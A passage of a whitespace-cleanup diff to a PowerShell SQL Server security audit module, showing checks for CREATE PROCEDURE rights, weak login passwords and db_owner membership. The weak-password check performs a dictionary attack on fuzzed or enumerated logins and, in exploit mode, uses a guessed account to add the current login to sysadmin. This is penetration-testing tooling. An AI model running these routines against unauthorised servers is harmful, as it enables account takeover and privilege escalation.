         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Windows credentials.')]
         [System.Management.Automation.PSCredential]
         [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
-        
+
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server instance to connection to.')]
-        [string]$Instance,       
+        [string]$Instance,
 
         [Parameter(Mandatory = $false,
         HelpMessage = "Don't output anything.")]
         [string]$NoOutput,
-        
+
         [Parameter(Mandatory = $false,
         HelpMessage = 'Exploit vulnerable issues.')]
         [switch]$Exploit
     )
 
     Begin
-    {                 
+    {
         # Table for output
-        $TblData = New-Object -TypeName System.Data.DataTable 
+        $TblData = New-Object -TypeName System.Data.DataTable
         $null = $TblData.Columns.Add('ComputerName')
         $null = $TblData.Columns.Add('Instance')
         $null = $TblData.Columns.Add('Vulnerability')
@@ -11017,15 +11041,15 @@ Function Invoke-SQLAuditPrivCreateProcedure
         $null = $TblData.Columns.Add('IsExploitable')
         $null = $TblData.Columns.Add('Exploited')
         $null = $TblData.Columns.Add('ExploitCmd')
-        $null = $TblData.Columns.Add('Details')    
-        $null = $TblData.Columns.Add('Reference')   
-        $null = $TblData.Columns.Add('Author')   
+        $null = $TblData.Columns.Add('Details')
+        $null = $TblData.Columns.Add('Reference')
+        $null = $TblData.Columns.Add('Author')
     }
 
     Process
-    {   
+    {
         # Status User
-        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: PERMISSION - CREATE PROCEDURE" 
+        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: PERMISSION - CREATE PROCEDURE"
 
         # Test connection to server
         $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
@@ -11035,7 +11059,7 @@ Function Invoke-SQLAuditPrivCreateProcedure
         {
             # Status user
             Write-Verbose -Message "$Instance : CONNECTION FAILED"
-            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: PERMISSION - CREATE PROCEDURE"           
+            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: PERMISSION - CREATE PROCEDURE"
             Return
         }
         else
@@ -11045,20 +11069,20 @@ Function Invoke-SQLAuditPrivCreateProcedure
 
         # Grab server, login, and role information
         $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
-        $ComputerName = $ServerInfo.ComputerName                
-        $CurrentLogin = $ServerInfo.CurrentLogin        
-        $CurrentLoginRoles = Get-SQLServerRoleMember -Instance $Instance  -Username $Username -Password $Password -Credential $Credential -PrincipalName $CurrentLogin -SuppressVerbose              
+        $ComputerName = $ServerInfo.ComputerName
+        $CurrentLogin = $ServerInfo.CurrentLogin
+        $CurrentLoginRoles = Get-SQLServerRoleMember -Instance $Instance  -Username $Username -Password $Password -Credential $Credential -PrincipalName $CurrentLogin -SuppressVerbose
         $CurrentPrincpalList = @()
         $CurrentPrincpalList += $CurrentLogin
         $CurrentPrincpalList += 'Public'
-        $CurrentLoginRoles | 
+        $CurrentLoginRoles |
         ForEach-Object -Process {
             $CurrentPrincpalList += $_.RolePrincipalName
-        }        
-        
-        # --------------------------------------------     
+        }
+
+        # --------------------------------------------
         # Set function meta data for report output
-        # --------------------------------------------  
+        # --------------------------------------------
         if($Exploit)
         {
             $TestMode  = 'Exploit'
@@ -11066,28 +11090,28 @@ Function Invoke-SQLAuditPrivCreateProcedure
         else
         {
             $TestMode  = 'Audit'
-        }       
+        }
         $Vulnerability = 'PERMISSION - CREATE PROCEDURE'
         $Description   = 'The login has privileges to create stored procedures in one or more databases.  This may allow the login to escalate privileges within the database.'
         $Remediation   = 'If the permission is not required remove it.  Permissions are granted with a command like: GRANT CREATE PROCEDURE TO user, and can be removed with a command like: REVOKE CREATE PROCEDURE TO user'
-        $Severity      = 'Medium' 
+        $Severity      = 'Medium'
         $IsVulnerable  = 'No'
-        $IsExploitable = 'No' 
+        $IsExploitable = 'No'
         $Exploited     = 'No'
         $ExploitCmd    = "No exploit is currently available that will allow $CurrentLogin to become a sysadmin."
-        $Details       = ''   
+        $Details       = ''
         $Dependancies = ''
-        $Reference     = 'https://msdn.microsoft.com/en-us/library/ms187926.aspx?f=255&MSPPError=-2147217396'       
-        $Author        = 'Scott Sutherland (@_nullbind), NetSPI 2016' 
-        
-        # -----------------------------------------------------------------     
+        $Reference     = 'https://msdn.microsoft.com/en-us/library/ms187926.aspx?f=255&MSPPError=-2147217396'
+        $Author        = 'Scott Sutherland (@_nullbind), NetSPI 2016'
+
+        # -----------------------------------------------------------------
         # Check for the Vulnerability
         # Note: Typically a missing patch or weak configuration
-        # -----------------------------------------------------------------         
+        # -----------------------------------------------------------------
 
         # Get all CREATE PROCEDURE grant permissions for all accessible databases
         $Permissions = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -HasAccess -SuppressVerbose | Get-SQLDatabasePriv -Instance $Instance -Username $Username -Password $Password -Credential $Credential -PermissionName 'CREATE PROCEDURE'
-        
+
         if($Permissions)
         {
             # Iterate through each current login and their associated roles
@@ -11095,11 +11119,11 @@ Function Invoke-SQLAuditPrivCreateProcedure
             ForEach-Object -Process {
                 # Check if they have the CREATE PROCEDURE grant
                 $CurrentPrincipal = $_
-                $Permissions | 
+                $Permissions |
                 ForEach-Object -Process {
                     $AffectedPrincipal = $_.PrincipalName
                     $AffectedDatabase = $_.DatabaseName
-                
+
                     if($AffectedPrincipal -eq $CurrentPrincipal)
                     {
                         # Set flag to vulnerable
@@ -11107,54 +11131,54 @@ Function Invoke-SQLAuditPrivCreateProcedure
                         Write-Verbose -Message "$Instance : - The $AffectedPrincipal principal has the CREATE PROCEDURE permission in the $AffectedDatabase database."
                         $Details = "The $AffectedPrincipal principal has the CREATE PROCEDURE permission in the $AffectedDatabase database."
 
-                        # -----------------------------------------------------------------     
-                        # Check for exploit dependancies 
+                        # -----------------------------------------------------------------
+                        # Check for exploit dependancies
                         # Note: Typically secondary configs required for dba/os execution
-                        # -----------------------------------------------------------------                        
-                        $HasAlterSchema = Get-SQLDatabasePriv -Instance $Instance -Username $Username -Password $Password -Credential $Credential -PermissionName 'ALTER' -PermissionType 'SCHEMA' -PrincipalName $CurrentPrincipal -DatabaseName $AffectedDatabase  -SuppressVerbose                                              
+                        # -----------------------------------------------------------------
+                        $HasAlterSchema = Get-SQLDatabasePriv -Instance $Instance -Username $Username -Password $Password -Credential $Credential -PermissionName 'ALTER' -PermissionType 'SCHEMA' -PrincipalName $CurrentPrincipal -DatabaseName $AffectedDatabase  -SuppressVerbose
                         if($HasAlterSchema)
                         {
-                            $IsExploitable = 'Yes'  
-                            $Dependancies = " $CurrentPrincipal also has ALTER SCHEMA permissions so procedures can be created." 
+                            $IsExploitable = 'Yes'
+                            $Dependancies = " $CurrentPrincipal also has ALTER SCHEMA permissions so procedures can be created."
                             Write-Verbose -Message "$Instance : - Dependancies were met: $CurrentPrincipal has ALTER SCHEMA permissions."
 
                             # Add to report example
-                            $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, "$Details$Dependancies", $Reference, $Author) | Out-Null                                            
+                            $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, "$Details$Dependancies", $Reference, $Author)
                         }
                         else
-                        {                            
+                        {
                             $IsExploitable = 'No'
-                            
-                            # Add to report example
-                            $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author) | Out-Null                                                                   
-                        }                                       
 
-                        # -----------------------------------------------------------------    
+                            # Add to report example
+                            $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
+                        }
+
+                        # -----------------------------------------------------------------
                         # Exploit Vulnerability
                         # Note: Add the current user to sysadmin fixed server role
-                        # -----------------------------------------------------------------    
-                        
+                        # -----------------------------------------------------------------
+
                         if($Exploit -and $IsExploitable -eq 'Yes')
                         {
                             Write-Verbose -Message "$Instance : - No server escalation method is available at this time."
                         }
-                    }         
+                    }
                 }
-            }                     
+            }
         }
         else
         {
             # Status user
             Write-Verbose -Message "$Instance : - The current login doesn't have the CREATE PROCEDURE permission in any databases."
-        }              
-                                                    
+        }
+
         # Status User
-        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: PERMISSION - CREATE PROCEDURE" 
+        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: PERMISSION - CREATE PROCEDURE"
     }
 
     End
-    {   
-        # Return data  
+    {
+        # Return data
         if ( -not $NoOutput)
         {
             Return $TblData
@@ -11173,29 +11197,29 @@ Function Invoke-SQLAuditWeakLoginPw
             .SYNOPSIS
             Check if the current login has the db_owner role in any databases.
             .PARAMETER Username
-            Known SQL Server login to obtain a list of logins with for testing. 
+            Known SQL Server login to obtain a list of logins with for testing.
             .PARAMETER TestUsername
             SQL Server or domain account to authenticate with.
             .PARAMETER UserFile
-            Path to list of users to use.  One per line.                     
+            Path to list of users to use.  One per line.
             .PARAMETER Password
-            Known SQL Server login password to obtain a list of logins with for testing. 
+            Known SQL Server login password to obtain a list of logins with for testing.
             .PARAMETER TestPassword
-            Password to test provided or discovered logins with. 
+            Password to test provided or discovered logins with.
             .PARAMETER PassFile
-            Path to list of password to use.  One per line. 
+            Path to list of password to use.  One per line.
             .PARAMETER Credential
-            SQL Server credential. 
+            SQL Server credential.
             .PARAMETER Instance
-            SQL Server instance to connection to. 
+            SQL Server instance to connection to.
             .PARAMETER NoUserAsPass
-            Don't try to login using the login name as the password. 
+            Don't try to login using the login name as the password.
             .PARAMETER NoUserEnum
-            Don't try to enumerate logins to test. 
+            Don't try to enumerate logins to test.
             .PARAMETER StartId
-            Start id for fuzzing login IDs when authenticating as a least privilege login. 
+            Start id for fuzzing login IDs when authenticating as a least privilege login.
             .PARAMETER EndId
-            End id for fuzzing login IDs when authenticating as a least privilege login. 
+            End id for fuzzing login IDs when authenticating as a least privilege login.
             .PARAMETER Exploit
             Exploit vulnerable issues.
             .EXAMPLE
@@ -11229,17 +11253,17 @@ Function Invoke-SQLAuditWeakLoginPw
             Reference     : https://msdn.microsoft.com/en-us/library/ms161959.aspx
             Author        : Scott Sutherland (@_nullbind), NetSPI 2016
             .EXAMPLE
-            PS C:\> Invoke-SQLAuditWeakLoginPw -Verbose -Instance SQLServer1\STANDARDDEV2014 
+            PS C:\> Invoke-SQLAuditWeakLoginPw -Verbose -Instance SQLServer1\STANDARDDEV2014
     #>
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Known SQL Server login to fuzz logins with.')]
         [string]$Username,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Username to test.')]
         [string]$TestUsername = 'sa',
 
@@ -11248,12 +11272,12 @@ Function Invoke-SQLAuditWeakLoginPw
         [string]$UserFile,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Known SQL Server password to fuzz logins with.')]
         [string]$Password,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server password to attempt to login with.')]
         [string]$TestPassword = 'password',
 
@@ -11266,41 +11290,41 @@ Function Invoke-SQLAuditWeakLoginPw
         [switch]$NoUserAsPass,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Windows credentials.')]
         [System.Management.Automation.PSCredential]
         [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
-        
+
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server instance to connection to.')]
-        [string]$Instance, 
-        
+        [string]$Instance,
+
         [Parameter(Mandatory = $false,
         HelpMessage = "Don't attempt to enumerate logins from the server.")]
         [switch]$NoUserEnum,
-        
+
         [Parameter(Mandatory = $false,
         HelpMessage = 'Start id for fuzzing login IDs.')]
         [int]$StartId = 1,
-        
+
         [Parameter(Mandatory = $false,
         HelpMessage = 'End id for fuzzing login IDss.')]
-        [int]$EndId = 500,                                   
+        [int]$EndId = 500,
 
         [Parameter(Mandatory = $false,
         HelpMessage = "Don't output anything.")]
         [switch]$NoOutput,
-        
+
         [Parameter(Mandatory = $false,
         HelpMessage = 'Exploit vulnerable issues.')]
         [switch]$Exploit
     )
 
     Begin
-    {                 
+    {
         # Table for output
-        $TblData = New-Object -TypeName System.Data.DataTable 
+        $TblData = New-Object -TypeName System.Data.DataTable
         $null = $TblData.Columns.Add('ComputerName')
         $null = $TblData.Columns.Add('Instance')
         $null = $TblData.Columns.Add('Vulnerability')
@@ -11311,15 +11335,15 @@ Function Invoke-SQLAuditWeakLoginPw
         $null = $TblData.Columns.Add('IsExploitable')
         $null = $TblData.Columns.Add('Exploited')
         $null = $TblData.Columns.Add('ExploitCmd')
-        $null = $TblData.Columns.Add('Details')    
-        $null = $TblData.Columns.Add('Reference')   
-        $null = $TblData.Columns.Add('Author')   
+        $null = $TblData.Columns.Add('Details')
+        $null = $TblData.Columns.Add('Reference')
+        $null = $TblData.Columns.Add('Author')
     }
 
     Process
-    {   
+    {
         # Status User
-        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: Weak Login Password" 
+        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: Weak Login Password"
 
         # Test connection to server
         $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
@@ -11329,7 +11353,7 @@ Function Invoke-SQLAuditWeakLoginPw
         {
             # Status user
             Write-Verbose -Message "$Instance : CONNECTION FAILED."
-            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Weak Login Password."           
+            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Weak Login Password."
             Return
         }
         else
@@ -11341,11 +11365,11 @@ Function Invoke-SQLAuditWeakLoginPw
         $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
         $CurrentLogin = $ServerInfo.CurrentLogin
         $ComputerName = $ServerInfo.ComputerName
-        $CurrentUSerSysadmin = $ServerInfo.IsSysadmin        
+        $CurrentUSerSysadmin = $ServerInfo.IsSysadmin
 
-        # --------------------------------------------     
+        # --------------------------------------------
         # Set function meta data for report output
-        # --------------------------------------------  
+        # --------------------------------------------
         if($Exploit)
         {
             $TestMode  = 'Exploit'
@@ -11353,24 +11377,24 @@ Function Invoke-SQLAuditWeakLoginPw
         else
         {
             $TestMode  = 'Audit'
-        }         
+        }
         $Vulnerability = 'Weak Login Password'
         $Description   = 'One or more SQL Server logins is configured with a weak password.  This may provide unauthorized access to resources the affected logins have access to.'
         $Remediation   = 'Ensure all SQL Server logins are required to use a strong password. Considered inheriting the OS password policy.'
-        $Severity      = 'High' 
+        $Severity      = 'High'
         $IsVulnerable  = 'No'
-        $IsExploitable = 'No' 
+        $IsExploitable = 'No'
         $Exploited     = 'No'
         $ExploitCmd    = 'Use the affected credentials to log into the SQL Server, or rerun this command with -Exploit.'
-        $Details       = ''   
-        $Reference     = 'https://msdn.microsoft.com/en-us/library/ms161959.aspx'       
-        $Author        = 'Scott Sutherland (@_nullbind), NetSPI 2016' 
-        
-        # -----------------------------------------------------------------     
+        $Details       = ''
+        $Reference     = 'https://msdn.microsoft.com/en-us/library/ms161959.aspx'
+        $Author        = 'Scott Sutherland (@_nullbind), NetSPI 2016'
+
+        # -----------------------------------------------------------------
         # Check for the Vulnerability
         # Note: Typically a missing patch or weak configuration
-        # -----------------------------------------------------------------     
-        
+        # -----------------------------------------------------------------
+
         # Create empty user / password lists
         $LoginList = @()
         $PasswordList = @()
@@ -11379,7 +11403,7 @@ Function Invoke-SQLAuditWeakLoginPw
         if($UserFile)
         {
             Write-Verbose -Message "$Instance - Getting logins from file..."
-            Get-Content -Path $UserFile | 
+            Get-Content -Path $UserFile |
             ForEach-Object -Process {
                 $LoginList += $_
             }
@@ -11391,7 +11415,7 @@ Function Invoke-SQLAuditWeakLoginPw
             Write-Verbose -Message "$Instance - Getting supplied login..."
             $LoginList += $TestUsername
         }
-        
+
         # Get logins for testing - fuzzed
         if(-not $NoUserEnum)
         {
@@ -11402,33 +11426,33 @@ Function Invoke-SQLAuditWeakLoginPw
             if($TestConnection)
             {
                 # Check if sysadmin
-                $IsSysadmin = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin               
+                $IsSysadmin = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin
                 if($IsSysadmin -eq 'Yes')
                 {
                     # Query for logins
                     Write-Verbose -Message "$Instance - Getting list of logins..."
-                    Get-SQLServerLogin -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | 
+                    Get-SQLServerLogin -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose |
                     Where-Object -FilterScript {
                         $_.PrincipalType -eq 'SQL_LOGIN'
                     } |
-                    Select-Object -Property PrincipalName -ExpandProperty PrincipalName | 
+                    Select-Object -Property PrincipalName -ExpandProperty PrincipalName |
                     ForEach-Object -Process {
                         $LoginList += $_
-                    } 
+                    }
                 }
                 else
                 {
-                    # Fuzz logins                
+                    # Fuzz logins
                     Write-Verbose -Message "$Instance - Fuzzing principal IDs $StartId to $EndId..."
-                    Get-SQLFuzzServerLogin -Instance $Instance -GetPrincipalType -Username $Username -Password $Password -Credential $Credential -StartId $StartId -EndId $EndId -SuppressVerbose | 
+                    Get-SQLFuzzServerLogin -Instance $Instance -GetPrincipalType -Username $Username -Password $Password -Credential $Credential -StartId $StartId -EndId $EndId -SuppressVerbose |
                     Where-Object -FilterScript {
                         $_.PrincipleType -eq 'SQL Login'
-                    } | 
-                    Select-Object -Property PrincipleName -ExpandProperty PrincipleName | 
+                    } |
+                    Select-Object -Property PrincipleName -ExpandProperty PrincipleName |
                     ForEach-Object -Process {
                         $LoginList += $_
-                    }  
-                }              
+                    }
+                }
             }
             else
             {
@@ -11437,10 +11461,10 @@ Function Invoke-SQLAuditWeakLoginPw
                     Write-Verbose -Message "$Instance - Connection Failed - Could not authenticate with provided credentials."
                 }
                 return
-            }                        
+            }
         }
 
-        # Check for users or return - count array        
+        # Check for users or return - count array
         if($LoginList.count -eq 0 -and (-not $FuzzLogins))
         {
             Write-Verbose -Message "$Instance - No logins have been provided."
@@ -11451,7 +11475,7 @@ Function Invoke-SQLAuditWeakLoginPw
         if($PassFile)
         {
             Write-Verbose -Message "$Instance - Getting password from file..."
-            Get-Content -Path $PassFile | 
+            Get-Content -Path $PassFile |
             ForEach-Object -Process {
                 $PasswordList += $_
             }
@@ -11464,7 +11488,7 @@ Function Invoke-SQLAuditWeakLoginPw
             $PasswordList += $TestPassword
         }
 
-        # Check for provided passwords         
+        # Check for provided passwords
         if($PasswordList.count -eq 0 -and (-not $UserAsPass))
         {
             Write-Verbose -Message "$Instance - No password have been provided."
@@ -11474,14 +11498,14 @@ Function Invoke-SQLAuditWeakLoginPw
         # Iternate through logins and perform dictionary attack
         Write-Verbose -Message "$Instance - Performing dictionary attack..."
         $LoginList |
-        Select-Object -Unique | 
+        Select-Object -Unique |
         ForEach-Object -Process {
             $TargetLogin = $_
             $PasswordList |
             Select-Object -Unique |
             ForEach-Object -Process {
                 $TargetPassword = $_
-                
+
                 $TestPass = Get-SQLConnectionTest -Instance $Instance -Username $TargetLogin -Password $TargetPassword -SuppressVerbose |
                 Where-Object -FilterScript {
                     $_.Status -eq 'Accessible'
@@ -11490,7 +11514,7 @@ Function Invoke-SQLAuditWeakLoginPw
                 {
                     # Check if guess credential is a sysadmin
                     $IsSysadmin = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $TargetLogin -Password $TargetPassword -SuppressVerbose |
-                    Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin               
+                    Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin
                     if($IsSysadmin -eq 'Yes')
                     {
                         $SysadminStatus = 'Sysadmin'
@@ -11500,47 +11524,47 @@ Function Invoke-SQLAuditWeakLoginPw
                         $SysadminStatus = 'Not Sysadmin'
                     }
 
-                    Write-Verbose -Message "$Instance - Successful Login: User = $TargetLogin ($SysadminStatus) Password = $TargetPassword"                     
+                    Write-Verbose -Message "$Instance - Successful Login: User = $TargetLogin ($SysadminStatus) Password = $TargetPassword"
 
                     if($Exploit)
                     {
                         Write-Verbose -Message "$Instance - Trying to make you a sysadmin..."
-                        
+
                         # Check if the current login is a sysadmin
                         $IsSysadmin1 = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose |
-                        Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin               
+                        Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin
                         if($IsSysadmin1 -eq 'Yes')
                         {
                             Write-Verbose -Message "$Instance - You're already a sysadmin. Nothing to do."
                         }
                         else
                         {
-                            Write-Verbose -Message "$Instance - You're not currently a sysadmin. Let's change that..." 
-                            
+                            Write-Verbose -Message "$Instance - You're not currently a sysadmin. Let's change that..."
+
                             # Add current user as sysadmin if login was successful
                             Get-SQLQuery -Instance $Instance -Username $TargetLogin -Password $TargetPassword -Credential $Credential -Query "EXEC sp_addsrvrolemember '$CurrentLogin','sysadmin'" -SuppressVerbose
 
                             # Check if the current login is a sysadmin again
                             $IsSysadmin2 = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose |
-                            Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin               
+                            Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin
                             if($IsSysadmin2 -eq 'Yes')
                             {
                                 $Exploited = 'Yes'
-                                Write-Verbose -Message "$Instance - SUCCESS! You're a sysadmin now." 
+                                Write-Verbose -Message "$Instance - SUCCESS! You're a sysadmin now."
                             }
                             else
                             {
                                 $Exploited = 'No'
-                                Write-Verbose -Message "$Instance - Fail. We coudn't add you as a sysadmin."                             
-                            }                                                
-                        }                                                                         
+                                Write-Verbose -Message "$Instance - Fail. We coudn't add you as a sysadmin."
+                            }
+                        }
                     }
 
-                    # Add record                    
+                    # Add record
                     $Details = "The $TargetLogin ($SysadminStatus) is configured with the password $TargetPassword."
                     $IsVulnerable = 'Yes'
                     $IsExploitable = 'Yes'
-                    $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)                                                                                     
+                    $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
                 }
                 else
                 {
@@ -11553,9 +11577,9 @@ Function Invoke-SQLAuditWeakLoginPw
         if(-not $NoUserAsPass)
         {
             $LoginList |
-            Select-Object -Unique | 
+            Select-Object -Unique |
             ForEach-Object -Process {
-                $TargetLogin = $_               
+                $TargetLogin = $_
                 $TestPass = Get-SQLConnectionTest -Instance $Instance -Username $TargetLogin -Password $TargetLogin -SuppressVerbose |
                 Where-Object -FilterScript {
                     $_.Status -eq 'Accessible'
@@ -11564,7 +11588,7 @@ Function Invoke-SQLAuditWeakLoginPw
                 {
                     # Check if user/name combo has sysadmin
                     $IsSysadmin3 = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $TargetLogin -Password $TargetLogin -SuppressVerbose |
-                    Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin               
+                    Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin
                     if($IsSysadmin3 -eq 'Yes')
                     {
                         $SysadminStatus = 'Sysadmin'
@@ -11580,39 +11604,39 @@ Function Invoke-SQLAuditWeakLoginPw
                     {
                         # Check if the current login is a sysadmin
                         $IsSysadmin4 = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose |
-                        Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin               
+                        Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin
                         if($IsSysadmin4 -eq 'Yes')
                         {
                             Write-Verbose -Message "$Instance - You're already a sysadmin. Nothing to do."
                         }
                         else
                         {
-                            Write-Verbose -Message "$Instance - You're not currently a sysadmin. Let's change that..." 
-                            
+                            Write-Verbose -Message "$Instance - You're not currently a sysadmin. Let's change that..."
+
                             # Add current user as sysadmin if login was successful
                             Get-SQLQuery -Instance $Instance -Username $TargetLogin -Password $TargetLogin -Credential $Credential -Query "EXEC sp_addsrvrolemember '$CurrentLogin','sysadmin'" -SuppressVerbose
 
                             # Check if the current login is a sysadmin again
                             $IsSysadmin5 = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose |
-                            Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin               
+                            Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin
                             if($IsSysadmin5 -eq 'Yes')
                             {
                                 $Exploited = 'Yes'
-                                Write-Verbose -Message "$Instance - SUCCESS! You're a sysadmin now." 
+                                Write-Verbose -Message "$Instance - SUCCESS! You're a sysadmin now."
                             }
                             else
                             {
                                 $Exploited = 'No'
-                                Write-Verbose -Message "$Instance - Fail. We coudn't add you as a sysadmin."                             
-                            }                                                                        
-                        }                                                                        
+                                Write-Verbose -Message "$Instance - Fail. We coudn't add you as a sysadmin."
+                            }
+                        }
                     }
 
-                    # Add record                    
+                    # Add record
                     $Details = "The $TargetLogin ($SysadminStatus) principal is configured with the password $TargetLogin."
                     $IsVulnerable = 'Yes'
                     $IsExploitable = 'Yes'
-                    $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)                                                                                     
+                    $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
                 }
                 else
                 {
@@ -11622,27 +11646,27 @@ Function Invoke-SQLAuditWeakLoginPw
         }
 
 
-        # -----------------------------------------------------------------     
-        # Check for exploit dependancies 
+        # -----------------------------------------------------------------
+        # Check for exploit dependancies
         # Note: Typically secondary configs required for dba/os execution
         # -----------------------------------------------------------------
         # $IsExploitable = "No" or $IsExploitable = "Yes"
         # Check if the link is alive and verify connection + check if sysadmin
 
 
-        # -----------------------------------------------------------------    
+        # -----------------------------------------------------------------
         # Exploit Vulnerability
         # Note: Add the current user to sysadmin fixed server role
-        # -----------------------------------------------------------------        
-        # $Exploited = "No" or $Exploited     = "Yes"   - check if login is a sysadmin                     
-                   
+        # -----------------------------------------------------------------
+        # $Exploited = "No" or $Exploited     = "Yes"   - check if login is a sysadmin
+
         # Status User
-        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Weak Login Password" 
+        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Weak Login Password"
     }
 
     End
-    {   
-        # Return data  
+    {
+        # Return data
         if ( -not $NoOutput)
         {
             Return $TblData | Sort-Object -Property computername, instance, details
@@ -11655,19 +11679,19 @@ Function Invoke-SQLAuditWeakLoginPw
 # Invoke-SQLAuditRoleDbOwner
 # ---------------------------------------
 # Author: Scott Sutherland
-Function Invoke-SQLAuditRoleDbOwner 
+Function Invoke-SQLAuditRoleDbOwner
 {
     <#
             .SYNOPSIS
             Check if the current login has the db_owner role in any databases.
             .PARAMETER Username
-            SQL Server or domain account to authenticate with.   
+            SQL Server or domain account to authenticate with.
             .PARAMETER Password
-            SQL Server or domain account password to authenticate with. 
+            SQL Server or domain account password to authenticate with.
             .PARAMETER Credential
-            SQL Server credential. 
+            SQL Server credential.
             .PARAMETER Instance
-            SQL Server instance to connection to. 
+            SQL Server instance to connection to.
             .PARAMETER Exploit
             Exploit vulnerable issues.
             .EXAMPLE
@@ -11676,9 +11700,9 @@ Function Invoke-SQLAuditRoleDbOwner
             ComputerName  : SQLServer1
             Instance      : SQLServer1\STANDARDDEV2014
             Vulnerability : DATABASE ROLE - DB_OWNER
-            Description   : The login has the DB_OWER role in one or more databases.  This may allow the login to escalate privileges to sysadmin if the affected databases are trusted and 
+            Description   : The login has the DB_OWER role in one or more databases.  This may allow the login to escalate privileges to sysadmin if the affected databases are trusted and
             owned by a sysadmin.
-            Remediation   : If the permission is not required remove it.  Permissions are granted with a command like: EXEC sp_addrolemember 'DB_OWNER', 'MyDbUser', and can be removed with 
+            Remediation   : If the permission is not required remove it.  Permissions are granted with a command like: EXEC sp_addrolemember 'DB_OWNER', 'MyDbUser', and can be removed with
